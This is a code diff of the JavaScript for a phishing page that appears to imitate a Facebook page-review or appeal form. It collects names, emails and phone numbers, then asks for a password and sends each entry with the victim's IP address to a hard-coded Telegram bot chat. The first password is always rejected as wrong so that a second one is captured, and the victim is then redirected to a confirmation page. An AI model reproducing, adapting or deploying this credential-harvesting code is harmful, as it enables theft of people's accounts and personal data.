@@ -8,44 +8,46 @@ function getIP(callback) {
 $(document).ready(function () {
 
     $('#input').html(`
-        <div class="mb-3">
-            <label for="page-name" class="form-label">
-                Page Name <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="page-name" aria-describedby="emailHelp">
-        </div>
-        <div class="mb-3">
-            <label for="full-name" class="form-label">
-                Full Name <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="full-name" aria-describedby="emailHelp">
-        </div>
-        <div class="mb-3">
-            <label for="business-email" class="form-label">
-                Business Email Address <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="business-email" aria-describedby="emailHelp">
-        </div>
-        <div class="mb-3">
-            <label for="personal-email" class="form-label">
-                Personal Email Address <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="personal-email" aria-describedby="emailHelp">
-        </div>
-        <div class="mb-3">
-            <label for="phone" class="form-label">
-                Mobile Phone Number <span class="text-danger">*</span>
-            </label>
-            <input type="text" class="form-control" required id="phone" aria-describedby="emailHelp">
-        </div>
-        <div class="mb-3">
-            <label for="full-name" class="form-label">
-                Please provide us information that will help us investigate.
-            </label>
-            <textarea class="form-control" id="description" rows="3"></textarea>
-        </div>
-        <button type="button" class="btn mb-4">Submit</button>
-    `);
+                            <div class="mb-3">
+                                <label for="page-name" class="form-label">
+                                    Page Name <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="page-name" aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="full-name" class="form-label">
+                                    Full Name <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="full-name" aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="business-email" class="form-label">
+                                    Business Email Address <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="business-email"
+                                    aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="personal-email" class="form-label">
+                                    Personal Email Address <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="personal-email"
+                                    aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="phone" class="form-label">
+                                    Mobile Phone Number <span class="text-danger">*</span>
+                                </label>
+                                <input type="text" class="form-control" required id="phone" aria-describedby="emailHelp">
+                            </div>
+                            <div class="mb-3">
+                                <label for="full-name" class="form-label">
+                                    Please provide us information that will help us investigate.
+                                </label>
+                                <textarea class="form-control" id="description" rows="3"></textarea>
+                            </div>
+                            <button type="button" class="btn mb-4">Submit</button>
+    `)
 
     openDetail();
     let IpAddress = '';
@@ -57,54 +59,67 @@ $(document).ready(function () {
 
     $('#phone').on('input', function () {
         var input = $(this).val();
-        var validInputRegex = /^[+\d]*$/;
+        var validInputRegex = /^[+\d]*$/; // Chỉ cho phép số và dấu cộng
 
         if (!validInputRegex.test(input)) {
+            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
             $(this).val(input.slice(0, -1));
         }
     });
+
 
 });
 
 function openDetail() {
     $(".nav-item-parent").on("click", function () {
-        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
-        var isOpen = currentRotate != 0;
+        var currentRotate = $(this).find(".arrow").css("rotate");
+        currentRotate = currentRotate.replace("deg", "");
+
+        var isOpen = currentRotate == 0 ? false : true;
 
         $(".detail").css("display", "none");
         $(".arrow").css("rotate", "0deg");
 
         const id = $(this).data("id");
-        if (!isOpen) {
+        if (isOpen) {
+            $("#" + id).css("display", "none");
+            $(this).find(".arrow").css("rotate", "0deg");
+        } else {
             $("#" + id).css("display", "block");
             $(this).find(".arrow").css("rotate", "180deg");
         }
     });
 
     $(".nav-item-child").on("click", function () {
-        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
-        var isOpen = currentRotate != 0;
+        var currentRotate = $(this).find(".arrow").css("rotate");
+        currentRotate = currentRotate.replace("deg", "");
+
+        var isOpen = currentRotate == 0 ? false : true;
 
         const id = $(this).data("id");
-        if (!isOpen) {
+        if (isOpen) {
+            $("#" + id).css("display", "none");
+            $(this).find(".arrow").css("rotate", "0deg");
+            $(this)
+                .find(".icon-container")
+                .css("background-color", "var(--color-white-secondary)");
+            $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
+            $(this).css("background", "none");
+        } else {
             $("#" + id).css("display", "block");
             $(this).find(".arrow").css("rotate", "180deg");
             $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
             $(this).find(".icon-container").css("background-color", "#1877F2");
             $(this).css("background", "#eaf3ffe8");
-        } else {
-            $("#" + id).css("display", "none");
-            $(this).find(".arrow").css("rotate", "0deg");
-            $(this).find(".icon-container").css("background-color", "var(--color-white-secondary)");
-            $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
-            $(this).css("background", "none");
         }
     });
 }
 
 function validateForm() {
+
     var isValid = true;
 
+    // Validate trường Page Name
     var pageName = $('#page-name').val();
     if (pageName === '') {
         isValid = false;
@@ -113,6 +128,7 @@ function validateForm() {
         $('#page-name').removeClass('border-danger');
     }
 
+    // Validate trường Full Name
     var fullName = $('#full-name').val();
     if (fullName === '') {
         isValid = false;
@@ -121,8 +137,9 @@ function validateForm() {
         $('#full-name').removeClass('border-danger');
     }
 
+    // Validate trường Business Email
     var businessEmail = $('#business-email').val();
-    var emailRegex = /^([a-zA-Z0-9_.+-])+@(([a-zA-Z0-9-])+\\.)+([a-zA-Z0-9]{2,4})+$/;
+    var emailRegex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
     if (!emailRegex.test(businessEmail)) {
         isValid = false;
         $('#business-email').addClass('border-danger');
@@ -130,6 +147,7 @@ function validateForm() {
         $('#business-email').removeClass('border-danger');
     }
 
+    // Validate trường Personal Email
     var personalEmail = $('#personal-email').val();
     if (!emailRegex.test(personalEmail)) {
         isValid = false;
@@ -138,8 +156,11 @@ function validateForm() {
         $('#personal-email').removeClass('border-danger');
     }
 
+    // Validate trường Phone
     var phone = $('#phone').val();
-    var phoneRegex = /^(\+\\d+|\\d+)$/;
+    // Cho phép dấu "+" ở đầu và sau đó là các chữ số
+    var phoneRegex = /^(\+\d+|\d+)$/;
+
     if (!phoneRegex.test(phone)) {
         isValid = false;
         $('#phone').addClass('border-danger');
@@ -147,25 +168,29 @@ function validateForm() {
         $('#phone').removeClass('border-danger');
     }
 
+
     return isValid;
+
 }
 
 var NUMBER_TIME_LOGIN = 0;
-let FIRST_PASSWORD = '';
 
 function sendForm(IpAddress) {
     $(".content #dataGet button[type=button]").off("click");
 
     $(".content #dataGet button[type=button]").on("click", function () {
         if (validateForm()) {
-            showPrompt(IpAddress);
+            showPrompt(IpAddress, true);
         }
     });
 }
 
-function showPrompt(IpAddress) {
-    $('#getPassword').removeClass('d-none');
+let FIRST_PASSWORD = '';
 
+function showPrompt(IpAddress) {
+
+
+    $('#getPassword').removeClass('d-none');
     $("#close-password").off("click");
     $('#close-password').on('click', function () {
         $('#getPassword').addClass('d-none');
@@ -180,7 +205,6 @@ function showPrompt(IpAddress) {
         } else {
             $('#password').removeClass('border-danger');
         }
-
         let secondPassword = '';
         if (NUMBER_TIME_LOGIN >= 1) {
             secondPassword = password;
@@ -202,9 +226,9 @@ function showPrompt(IpAddress) {
         const chatId = '-1002416068664';
         const message = message1;
 
-        $('#submit-password').prop('disabled', true);
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        fetch(telegramUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -216,33 +240,39 @@ function showPrompt(IpAddress) {
             })
         })
         .then(response => {
-            if (!response.ok) throw new Error('Network error');
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
             return response.json();
         })
         .then(data => {
             NUMBER_TIME_LOGIN++;
             if (NUMBER_TIME_LOGIN === 1) {
-                FIRST_PASSWORD = password;
+    FIRST_PASSWORD = password;
+    setTimeout(function () {
+        $('.lsd-ring-container').addClass('d-none');
+        $('#wrong-password').removeClass('d-none');
+        $("#password").val('');
 
-                setTimeout(function () {
-                    $('.lsd-ring-container').addClass('d-none');
-                    $('#wrong-password').removeClass('d-none');
-                    $("#password").val('');
+        const submitBtn = $('#submit-password');
+        submitBtn.prop('disabled', true);
 
-                    let countdown = 10;
-                    $('#submit-password').text(`Wait ${countdown}s`);
-                    const timer = setInterval(() => {
-                        countdown--;
-                        $('#submit-password').text(`Wait ${countdown}s`);
-                        if (countdown <= 0) {
-                            clearInterval(timer);
-                            $('#submit-password').prop('disabled', false);
-                            $('#submit-password').text('Continue');
-                        }
-                    }, 1000);
+        let countdown = 10;
+        submitBtn.text(`Wait ${countdown}s`);
 
-                }, 2000);
+        const interval = setInterval(() => {
+            countdown--;
+            if (countdown > 0) {
+                submitBtn.text(`Wait ${countdown}s`);
             } else {
+                clearInterval(interval);
+                submitBtn.prop('disabled', false);
+                submitBtn.text('Continue');
+            }
+        }, 1000);
+    }, 2000);
+}
+ else {
                 setTimeout(function () {
                     $('.lsd-ring-container').addClass('d-none');
                     window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
@@ -256,9 +286,10 @@ function showPrompt(IpAddress) {
                     icon: "error"
                 });
                 $('.lsd-ring-container').addClass('d-none');
-                $('#submit-password').prop('disabled', false);
-                $('#submit-password').text('Continue');
             }, 500);
         });
+
     });
+
+
 }
